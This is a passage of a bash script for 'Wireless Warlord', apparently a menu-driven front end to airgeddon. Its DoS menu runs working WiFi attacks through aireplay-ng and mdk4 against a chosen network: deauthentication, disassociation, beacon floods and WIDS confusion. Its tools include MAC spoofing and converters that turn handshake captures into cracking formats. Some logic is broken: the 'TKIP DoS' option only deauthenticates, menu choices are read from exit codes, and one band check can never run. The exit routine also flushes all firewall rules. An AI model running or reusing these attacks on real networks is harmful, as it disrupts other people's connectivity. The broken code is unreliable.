        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose attack method:" \
        $HEIGHT $WIDTH 10 \
        "1" "💣 Deauthentication Attack" \
        "2" "🔥 TKIP/Michael Countermeasures DoS" \
        "3" "📶 Beacon Flood Attack" \
        "4" "📱 Client Disassociation" \
        "5" "🔄 WIDS/WIPS Confusion Attack" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        # For all DoS attacks, first we need to select a target network
        # (except for beacon flood which targets all networks)
        if [ "$selection" != "3" ]; then
            dialog --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --msgbox "A new window will open to scan for networks.\n\nPress Ctrl+C in that window when you see your target network." \
                10 60
            
            xterm -title "Wireless Warlord - Network Scan" -bg black -fg green -e "airodump-ng $interface" &
            local scan_pid=$!
            sleep 3
            
            # Ask for target information
            exec 3>&1
            local target_bssid=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --inputbox "Enter BSSID of target network:" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                kill $scan_pid 2>/dev/null
                return
            fi
            
            exec 3>&1
            local target_channel=$(dialog \
                --clear \
                --backtitle "Wireless Warlord ${WW_VERSION}" \
                --title "🎯 Target Selection" \
                --inputbox "Enter channel of target network:" \
                8 60 \
                2>&1 1>&3)
            exit_status=$?
            exec 3>&-
            
            if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                kill $scan_pid 2>/dev/null
                return
            fi
            
            # Kill the scanning process
            kill $scan_pid 2>/dev/null
        fi
        
        # Perform the selected attack
        case $selection in
            1)
                # Deauthentication attack
                exec 3>&1
                local deauth_method=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "💣 Deauthentication Attack" \
                    --radiolist "Select deauth method:" \
                    12 60 3 \
                    "1" "Deauth all clients" ON \
                    "2" "Deauth specific client" OFF \
                    "3" "MDK4 Deauthentication" OFF \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    return
                fi
                
                if [ "$deauth_method" = "2" ]; then
                    # Show clients and select one
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "📱 Client Scan" \
                        --msgbox "A new window will open to scan for clients.\n\nPress Ctrl+C when you see your target client." \
                        10 60
                    
                    xterm -title "Wireless Warlord - Client Scan" -bg black -fg green -e "airodump-ng --bssid $target_bssid -c $target_channel $interface" &
                    local client_scan_pid=$!
                    sleep 3
                    
                    exec 3>&1
                    local target_client=$(dialog \
                        --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "🎯 Client Selection" \
                        --inputbox "Enter MAC of target client:" \
                        8 60 \
                        2>&1 1>&3)
                    exit_status=$?
                    exec 3>&-
                    
                    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                        kill $client_scan_pid 2>/dev/null
                        return
                    fi
                    
                    kill $client_scan_pid 2>/dev/null
                    
                    # Deauth specific client
                    xterm -title "Wireless Warlord - Client Deauth" -bg black -fg red -e "aireplay-ng --deauth 0 -a $target_bssid -c $target_client $interface" &
                else
                    if [ "$deauth_method" = "3" ]; then
                        # MDK4 Deauthentication
                        xterm -title "Wireless Warlord - MDK4 Deauth" -bg black -fg red -e "mdk4 $interface d -B $target_bssid -c $target_channel" &
                    else
                        # Deauth all clients (method 1)
                        xterm -title "Wireless Warlord - Deauth Attack" -bg black -fg red -e "aireplay-ng --deauth 0 -a $target_bssid $interface" &
                    fi
                fi
                ;;
            2)
                # TKIP/Michael Countermeasures DoS
                xterm -title "Wireless Warlord - TKIP DoS" -bg black -fg red -e "aireplay-ng --deauth 1 -a $target_bssid $interface && aireplay-ng -0 1 -a $target_bssid $interface" &
                ;;
            3)
                # Beacon Flood Attack
                exec 3>&1
                local beacon_count=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📶 Beacon Flood" \
                    --inputbox "Enter number of APs to simulate (1-100):" \
                    8 60 \
                    "50" \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    return
                fi
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📶 Beacon Flood" \
                    --radiolist "Select tool:" \
                    10 60 2 \
                    "1" "MDK4" ON \
                    "2" "Airbase-ng" OFF \
                    2>&1 1>&3
                local tool=$?
                
                if [ $tool -eq 0 ]; then
                    # MDK4 Beacon Flood
                    xterm -title "Wireless Warlord - Beacon Flood" -bg black -fg red -e "mdk4 $interface b -n $beacon_count" &
                else
                    # Airbase-ng Beacon Flood
                    xterm -title "Wireless Warlord - Beacon Flood" -bg black -fg red -e "for i in \$(seq 1 $beacon_count); do airbase-ng -a \$(macchanger --show | grep -o -E '([0-9a-f]{2}:){5}([0-9a-f]{2})') --essid=\"FakeAP\$i\" -c \$((i % 12)) $interface & done" &
                fi
                ;;
            4)
                # Client Disassociation
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📱 Client Scan" \
                    --msgbox "A new window will open to scan for clients.\n\nPress Ctrl+C when you see your target client." \
                    10 60
                
                xterm -title "Wireless Warlord - Client Scan" -bg black -fg green -e "airodump-ng --bssid $target_bssid -c $target_channel $interface" &
                local client_scan_pid=$!
                sleep 3
                
                exec 3>&1
                local target_client=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🎯 Client Selection" \
                    --inputbox "Enter MAC of target client:" \
                    8 60 \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    kill $client_scan_pid 2>/dev/null
                    return
                fi
                
                kill $client_scan_pid 2>/dev/null
                
                # Client Disassociation
                xterm -title "Wireless Warlord - Disassociation" -bg black -fg red -e "aireplay-ng -0 0 -a $target_bssid -c $target_client $interface" &
                ;;
            5)
                # WIDS/WIPS Confusion Attack
                xterm -title "Wireless Warlord - WIDS Confusion" -bg black -fg red -e "mdk4 $interface f -b $target_bssid -c $target_channel" &
                ;;
        esac
        
        dialog --clear \
            --backtitle "Wireless Warlord ${WW_VERSION}" \
            --title "💥 DoS Attack Started" \
            --msgbox "The attack has been started in a new window.\n\nPress Ctrl+C in that window to stop the attack." \
            8 50
    fi
}

# Function for tools menu
tools_menu() {
    exec 3>&1
    local selection=$(dialog \
        --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "🔧 Tools" \
        --ok-label "Select" \
        --cancel-label "Back" \
        --menu "Choose a tool:" \
        $HEIGHT $WIDTH 10 \
        "1" "📱 MAC Address Changer" \
        "2" "🔍 Network Interface Info" \
        "3" "📶 WiFi Signal Monitor" \
        "4" "🔑 Hash Converter" \
        "5" "📊 Channel Utilization Scan" \
        "6" "📡 USB WiFi Adapter Status" \
        2>&1 1>&3)
    exit_status=$?
    exec 3>&-
    
    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
        case $selection in
            1)
                # MAC Address Changer
                if [ -z "$interface" ]; then
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "⚠️ No Interface Selected" \
                        --msgbox "Please select an interface first." \
                        8 40
                    return
                fi
                
                exec 3>&1
                local mac_option=$(dialog \
                    --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📱 MAC Address Changer" \
                    --radiolist "Select option:" \
                    12 60 3 \
                    "1" "Random MAC address" ON \
                    "2" "Custom MAC address" OFF \
                    "3" "Restore original MAC" OFF \
                    2>&1 1>&3)
                exit_status=$?
                exec 3>&-
                
                if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                    return
                fi
                
                case $mac_option in
                    1)
                        # Random MAC
                        ifconfig $interface down
                        macchanger -r $interface | dialog --programbox "Changing MAC address..." 15 70
                        ifconfig $interface up
                        ;;
                    2)
                        # Custom MAC
                        exec 3>&1
                        local custom_mac=$(dialog \
                            --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "📱 Custom MAC" \
                            --inputbox "Enter MAC address (XX:XX:XX:XX:XX:XX):" \
                            8 60 \
                            2>&1 1>&3)
                        exit_status=$?
                        exec 3>&-
                        
                        if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                            ifconfig $interface down
                            macchanger -m $custom_mac $interface | dialog --programbox "Changing MAC address..." 15 70
                            ifconfig $interface up
                        fi
                        ;;
                    3)
                        # Restore original MAC
                        ifconfig $interface down
                        macchanger -p $interface | dialog --programbox "Restoring original MAC address..." 15 70
                        ifconfig $interface up
                        ;;
                esac
                ;;
            2)
                # Network Interface Info
                local interfaces=$(ip -o link show | awk -F': ' '{print $2}' | sort)
                local interface_info=""
                
                for iface in $interfaces; do
                    local mac=$(ip link show $iface | grep -o -E '([0-9a-f]{2}:){5}([0-9a-f]{2})' | head -n 1)
                    local status=$(ip link show $iface | grep -o "state [A-Z]* " | cut -d' ' -f2)
                    local ip=$(ip -o -4 addr list $iface 2>/dev/null | awk '{print $4}' | cut -d/ -f1)
                    local type=$(cat /sys/class/net/$iface/type 2>/dev/null || echo "Unknown")
                    
                    # Convert type number to human-readable
                    case $type in
                        "1") type="Ethernet" ;;
                        "772") type="Wireless" ;;
                        "772") type="Wireless" ;;
                        "65534") type="Virtual" ;;
                        *) type="Other" ;;
                    esac
                    
                    interface_info+="Interface: $iface\n"
                    interface_info+="  Type: $type\n"
                    interface_info+="  Status: $status\n"
                    interface_info+="  MAC: $mac\n"
                    if [ -n "$ip" ]; then
                        interface_info+="  IP: $ip\n"
                    else
                        interface_info+="  IP: Not assigned\n"
                    fi
                    interface_info+="\n"
                done
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔍 Network Interface Information" \
                    --msgbox "$interface_info" \
                    20 70
                ;;
            3)
                # WiFi Signal Monitor
                if [ -z "$interface" ]; then
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "⚠️ No Interface Selected" \
                        --msgbox "Please select an interface first." \
                        8 40
                    return
                fi
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📶 WiFi Signal Monitor" \
                    --msgbox "A new window will open to scan for networks.\n\nPress Ctrl+C in that window when done." \
                    10 60
                
                # Get interface mode and switch if needed
                local interface_mode=$(get_interface_mode "$interface")
                local original_interface=$interface
                
                if [ "$interface_mode" = "monitor" ]; then
                    # Switch to managed mode temporarily
                    exec_airmon_ng stop "$interface" | dialog --programbox "Switching to managed mode..." 15 70
                    interface=$(get_managed_mode_interface "$interface")
                fi
                
                # Monitor signal strength
                xterm -title "Wireless Warlord - Signal Monitor" -bg black -fg green -e "watch -n 1 iwconfig $interface" &
                
                # Wait for user to close the window
                sleep 3
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📶 WiFi Signal Monitor" \
                    --msgbox "Signal monitor is running in a new window.\n\nPress Ctrl+C in that window to stop monitoring." \
                    8 60
                
                # Restore monitor mode if needed
                if [ "$interface_mode" = "monitor" ]; then
                    exec_airmon_ng start "$interface" | dialog --programbox "Restoring monitor mode..." 15 70
                    interface=$original_interface
                fi
                ;;
            4)
                # Hash Converter
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "🔑 Hash Converter" \
                    --radiolist "Select conversion:" \
                    12 60 3 \
                    "1" "PCAP to HCCAPX (Hashcat)" ON \
                    "2" "PCAP to PMKID Hash" OFF \
                    "3" "HCCAPX to JTR format" OFF \
                    2>&1 1>&3
                local conversion=$?
                
                if [ $conversion -eq 0 ]; then
                    exec 3>&1
                    local input_file=$(dialog \
                        --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "🔑 Hash Converter" \
                        --inputbox "Enter path to input file:" \
                        8 60 \
                        "$log_session_dir/handshake-01.cap" \
                        2>&1 1>&3)
                    exit_status=$?
                    exec 3>&-
                    
                    if [ $exit_status -eq $DIALOG_CANCEL ] || [ $exit_status -eq $DIALOG_ESC ]; then
                        return
                    fi
                    
                    exec 3>&1
                    local output_file=$(dialog \
                        --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "🔑 Hash Converter" \
                        --inputbox "Enter path for output file:" \
                        8 60 \
                        "${input_file%.*}.hccapx" \
                        2>&1 1>&3)
                    exit_status=$?
                    exec 3>&-
                    
                    if [ $exit_status -ne $DIALOG_CANCEL ] && [ $exit_status -ne $DIALOG_ESC ]; then
                        case $conversion in
                            1)
                                # PCAP to HCCAPX
                                cap2hccapx "$input_file" "$output_file" 2>&1 | dialog --programbox "Converting..." 15 70
                                ;;
                            2)
                                # PCAP to PMKID
                                hcxpcapngtool -o "$output_file" "$input_file" 2>&1 | dialog --programbox "Converting..." 15 70
                                ;;
                            3)
                                # HCCAPX to JTR
                                hccapx2john "$input_file" > "$output_file" 2>&1 | dialog --programbox "Converting..." 15 70
                                ;;
                        esac
                        
                        dialog --clear \
                            --backtitle "Wireless Warlord ${WW_VERSION}" \
                            --title "✅ Conversion Complete" \
                            --msgbox "File has been converted to: $output_file" \
                            8 60
                    fi
                fi
                ;;
            5)
                # Channel Utilization Scan
                if [ -z "$interface" ]; then
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "⚠️ No Interface Selected" \
                        --msgbox "Please select an interface first." \
                        8 40
                    return
                fi
                
                local interface_mode=$(get_interface_mode "$interface")
                if [ "$interface_mode" != "monitor" ]; then
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "⚠️ Wrong Interface Mode" \
                        --yesno "Interface must be in monitor mode. Would you like to enable monitor mode now?" \
                        8 60
                        
                    if [ $? -eq 0 ]; then
                        exec_airmon_ng start "$interface" | dialog --programbox "Enabling monitor mode..." 20 70
                        local new_interface=$(get_monitor_mode_interface "$interface")
                        if [ -n "$new_interface" ]; then
                            interface=$new_interface
                            current_interface="($interface)"
                        else
                            dialog --clear \
                                --backtitle "Wireless Warlord ${WW_VERSION}" \
                                --title "❌ Error" \
                                --msgbox "Failed to enable monitor mode." \
                                8 40
                            return
                        fi
                    else
                        return
                    fi
                fi
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📊 Channel Utilization" \
                    --radiolist "Select band:" \
                    10 60 2 \
                    "1" "2.4 GHz band" ON \
                    "2" "5 GHz band" OFF \
                    2>&1 1>&3
                local band=$?
                
                if [ $band -eq 0 ]; then
                    if [ $band -eq 1 ]; then
                        # 2.4 GHz
                        xterm -title "Wireless Warlord - Channel Utilization (2.4 GHz)" -bg black -fg green -e "airodump-ng --band bg $interface" &
                    else
                        # 5 GHz
                        xterm -title "Wireless Warlord - Channel Utilization (5 GHz)" -bg black -fg green -e "airodump-ng --band a $interface" &
                    fi
                    
                    dialog --clear \
                        --backtitle "Wireless Warlord ${WW_VERSION}" \
                        --title "📊 Channel Utilization Scan" \
                        --msgbox "Channel utilization scan is running in a new window.\n\nPress Ctrl+C in that window to stop the scan." \
                        8 60
                fi
                ;;
            6)
                # USB WiFi Adapter Status
                local usb_adapters=$(lsusb | grep -i "wireless\|wifi\|802.11" || lsusb)
                local status_output="USB WiFi Adapters:\n\n$usb_adapters\n\n"
                
                # Get more detailed info from kernel
                status_output+="Kernel Driver Information:\n\n"
                status_output+=$(lspci -k | grep -A 3 -i "network\|wireless")
                
                dialog --clear \
                    --backtitle "Wireless Warlord ${WW_VERSION}" \
                    --title "📡 USB WiFi Adapter Status" \
                    --msgbox "$status_output" \
                    20 70
                ;;
        esac
    fi
}

# Function for about menu
about_menu() {
    local about_text="Wireless Warlord ${WW_VERSION}\n"
    about_text+="A modern, user-friendly wireless network auditing tool\n\n"
    about_text+="Based on airgeddon by v1s1t0r\n\n"
    about_text+="Wireless Warlord provides all the powerful functionality of airgeddon with\n"
    about_text+="a modern, intuitive interface featuring arrow key navigation and\n"
    about_text+="colorful, visual elements for a better user experience.\n\n"
    about_text+="Current session log directory:\n"
    about_text+="$log_session_dir"
    
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "ℹ️ About Wireless Warlord" \
        --msgbox "$about_text" \
        15 70
}

# Function to handle exit
handle_exit() {
    # Kill any running processes
    terminate_running_processes
    
    # Show final message with log location
    echo -e "${GREEN}Thank you for using Wireless Warlord!${NC}"
    if [ -n "$log_session_dir" ]; then
        echo -e "${CYAN}Logs saved in: ${log_session_dir}${NC}"
    fi
    echo
}

# Function to handle errors
handle_error() {
    local line=$1
    dialog --clear \
        --backtitle "Wireless Warlord ${WW_VERSION}" \
        --title "❌ Error Occurred" \
        --yesno "An error occurred at line $line.\n\nDo you want to continue or exit?" \
        8 50
        
    if [ $? -eq 1 ]; then
        handle_exit
        exit 1
    fi
}

# Terminate running processes
terminate_running_processes() {
    # First clean any running processes from log directory
    if [ -n "$log_session_dir" ] && [ -d "$log_session_dir" ]; then
        local pid_files=(
            "$log_session_dir/et_process_pids.txt"
            "$log_session_dir/wep_attack_pids.txt"
        )
        
        for pid_file in "${pid_files[@]}"; do
            if [ -f "$pid_file" ]; then
                kill $(cat "$pid_file") 2>/dev/null
            fi
        done
    fi
    
    # Clean up network configurations
    ifconfig $interface down 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -F 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null
}

# Main function
main() {
    # Check dependencies
    check_dialog
    check_airgeddon
    
    # Initialize directories
    initialize_directories
    
    # Show splash screen
    show_splash_screen
    
    # Source UI elements and load airgeddon
    load_airgeddon
    
    # Start the main menu
    ww_main_menu
}

# Run main function
main
